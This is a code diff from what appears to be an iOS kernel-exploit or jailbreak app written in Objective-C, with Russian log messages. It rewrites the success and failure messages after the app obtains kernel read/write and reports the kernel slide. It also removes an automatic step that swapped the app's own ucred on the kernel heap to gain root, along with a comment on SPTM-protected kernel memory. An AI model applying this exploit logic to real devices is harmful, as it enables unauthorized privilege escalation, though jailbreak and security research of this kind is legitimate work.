@@ -429,11 +429,11 @@ static BOOL sHasKRW = NO;
         kpStopCapture();
 
         if (er != 0 || !gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
-            [log appendFormat:@"Эксплойт НЕ удался (код %d). Можно повторить — кнопка снова активна.", er];
+            [log appendFormat:@"[RESULT] ЭКСПЛОЙТ: FAIL (код %d) — жми «Запустить эксплойт» ещё раз.", er];
             return NO;
         }
         sHasKRW = YES;
-        [log appendFormat:@"Эксплойт УСПЕШЕН. kernel slide = %#llx, kernel base = %#llx",
+        [log appendFormat:@"[RESULT] ЭКСПЛОЙТ: УСПЕШЕН. kernel slide = %#llx, kernel base = %#llx",
             gSystemInfo.kernelConstant.slide, kconstant(staticBase) + gSystemInfo.kernelConstant.slide];
         [log appendFormat:@"kreadbuf=%p kwritebuf=%p minSafeRead=0x%x",
             gPrimitives.kreadbuf, gPrimitives.kwritebuf, gPrimitives.krwMinSafeReadSize];
@@ -449,21 +449,7 @@ static BOOL sHasKRW = NO;
     libjailbreak_translation_init();
     [KPDump initializeBootConstantsGuarded];
 
-    // 1.9.0: strategy pivot. The panic registers proved kernel statics are
-    // SPTM read-only for EL1 (A0 wrote mach_kobj_count -> permission fault
-    // l3; A1's frame_table is SPTM-owned). Heap writes work — the promotion
-    // round trip wrote into an inpcb in a zone. So the jailbreak goes the
-    // heap way: patch our own proc's ucred -> uid 0. A0/A1 stay as manual
-    // buttons only (they document that EL1 statics are closed).
-    [log append:@"\n[E9 auto] root через ucred swap — сразу после победы, без нажатий"];
-    NSString *e9 = [KPDump ucredHeapSwapReport];
-    [log append:e9];
-    NSString *docsE9 = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
-    [e9 writeToFile:[docsE9 stringByAppendingPathComponent:@"kexproof-e9.txt"]
-         atomically:YES encoding:NSUTF8StringEncoding error:nil];
-    [log appendFormat:@"[E9 auto] uid сейчас: %d (%s)", getuid(), getuid() == 0 ? "ROOT!" : "не root"];
-
-    [log append:@"Этапы 1-3 готовы, KRW жив. Дамп — отдельной кнопкой (дамп пишется инкрементально, паника не сотрёт готовые секции)."];
+    [log append:@"[RESULT] ЭКСПЛОЙТ: OK — KRW готова, можно жать «Атака»."];
     return YES;
 }
 
